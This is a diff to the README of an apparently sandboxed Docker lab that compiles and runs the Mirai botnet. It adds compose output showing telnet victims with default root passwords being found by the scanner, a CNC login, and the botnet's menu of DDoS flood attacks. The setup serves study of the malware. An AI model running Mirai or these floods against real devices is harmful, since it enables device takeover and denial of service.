@@ -149,13 +149,32 @@ $ docker compose run compile ./debug.sh
 ```
 $ docker compose up
 ```
+```
+mirai-docker-compile-1 exited with code 0
+mirai-docker-victim-1   | victim :: A telnetd is running at 172.20.0.11:23
+mirai-docker-victim-1   | victim :: User: root, Password: 1234
+mirai-docker-victim2-1  | victim2 :: A telnetd is running at 172.20.0.12:23
+mirai-docker-victim2-1  | victim2 :: User: root, Password: password
+mirai-docker-victim3-1  | victim3 :: A telnetd is running at 172.20.0.13:23
+mirai-docker-victim3-1  | victim3 :: User: root, Password: system
+mirai-docker-bot-1 exited with code 0
+mirai-docker-mariadb-1  | .....
+mirai-docker-cnc-1      | Mysql DB opened
+mirai-docker-scan-1     | Start scanListen
+mirai-docker-scan-1     | 172.20.0.12:23 root:password
+mirai-docker-scan-1     | 172.20.0.13:23 root:system
+mirai-docker-scan-1     | 172.20.0.11:23 root:1234
+```
 
 ## 09. Connect to CNC server
 ```
 $ docker compose exec cnc telnet 127.0.0.1
 ```
+or
 ```
 $ telnet 127.0.0.1
+```
+```
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
 Escape character is '^]'.
@@ -176,6 +195,19 @@ Escape character is '^]'.
 [!] Sharing access IS prohibited!
 [!] Do NOT share your credentials!
 Ready
+mirai-user@botnet# ?
+Available attack list
+dns: DNS resolver flood using the targets domain, input IP is ignored
+stomp: TCP stomp flood
+udpplain: UDP flood with less options. optimized for higher PPS
+udp: UDP flood
+vse: Valve source engine specific flood
+syn: SYN flood
+ack: ACK flood
+greip: GRE IP flood
+greeth: GRE Ethernet flood
+http: HTTP flood
+
 mirai-user@botnet#
 ```
 
@@ -199,7 +231,7 @@ $ docker compose run victim
 ```
 
 
-## 10. Run bot
+## 10. Run first bot
 It will scan and report victims.
 ```
 $ docker compose run bot /home/user/src/mirai/debug/mirai.dbg
